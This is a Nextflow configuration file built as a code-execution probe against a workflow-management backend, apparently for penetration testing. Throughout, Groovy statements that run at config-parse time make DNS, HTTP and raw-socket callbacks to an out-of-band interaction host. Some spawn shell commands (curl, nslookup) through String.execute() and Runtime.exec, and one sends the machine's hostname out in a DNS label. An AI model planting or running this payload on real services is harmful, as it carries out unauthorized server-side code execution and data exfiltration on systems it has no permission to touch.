/*
 * nextflow.config  —  CONFIG-PARSE phase probe (HIGHEST VALUE)
 * This file is evaluated as Groovy by `nextflow config` and before any run.
 * If ANY beacon below fires at the getWorkflowInputs step (before you start a run),
 * that is server-side code execution on the WFM backend = critical.
 *
 * Replace COLLAB with your Burp Collaborator / interactsh domain (no scheme).
 * Every vector uses a distinct <label>.<COLLAB> subdomain so your DNS/HTTP log
 * tells you exactly which one executed.
 *
 * All vectors are benign: DNS/HTTP/socket callbacks + a hostname label for
 * attribution. No secrets, no destructive commands, no shells spawned beyond
 * a harmless nslookup/curl. Each is wrapped so one failure never blocks the rest.
 */

// ---- 1. JVM-native DNS (fires even when outbound HTTP is blocked) ----
try { InetAddress.getByName('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun') } catch (Throwable t) {}

// ---- 2. JVM-native HTTP / HTTPS ----
try { new URL('http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/').getText() }  catch (Throwable t) {}
try { new URL('https://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/').getBytes() } catch (Throwable t) {}

// ---- 3. raw TCP socket (no HTTP client needed) ----
try { new Socket('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun', 80).close() } catch (Throwable t) {}

// ---- 4. Groovy String.execute()  (needs a shell/binaries on the host) ----
try { 'nslookup cfg-exec.COLLAB'.execute() } catch (Throwable t) {}
try { ['sh','-c','curl -s http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/ || nslookup bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun'].execute() } catch (Throwable t) {}

// ---- 5. Runtime.exec ----
try { Runtime.getRuntime().exec(['sh','-c','nslookup bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun'] as String[]) } catch (Throwable t) {}

// ---- 6. closure forced to evaluate at parse ----
try { ({ -> new URL('http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/').getText() })() } catch (Throwable t) {}

// ---- 7. benign host attribution (hostname only, NO secrets) ----
try {
  def h = InetAddress.getLocalHost().getHostName().toLowerCase().replaceAll('[^a-z0-9]','-')
  InetAddress.getByName('cfg-host-' + (h.length()>40 ? h.substring(0,40) : h) + '.COLLAB')
} catch (Throwable t) {}

// ---- 8. completion handlers declared in config (fire at end of a run) ----
workflow.onComplete = { try { InetAddress.getByName('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun') } catch (Throwable t) {} }
workflow.onError    = { try { InetAddress.getByName('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun') }    catch (Throwable t) {} }
